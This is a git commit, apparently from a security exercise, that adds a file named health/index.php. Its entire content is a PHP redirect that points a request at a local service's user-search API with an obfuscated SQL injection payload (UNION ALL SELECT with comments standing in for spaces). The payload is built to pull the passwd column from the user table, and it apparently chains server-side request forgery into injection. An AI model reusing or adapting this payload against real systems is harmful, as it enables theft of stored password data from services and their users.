4aaa0679c743c5a3772bf0a6d11917cf83024920
Ian Curtis <71790592+vorkampfer@users.noreply.github.com>
2024-03-20 19:06:49 +0000

    Add files via upload

---
+++ health/index.php
@@ -0,0 +1,3 @@
+<?php
+	header("Location: http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/passwd/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-");
+?>
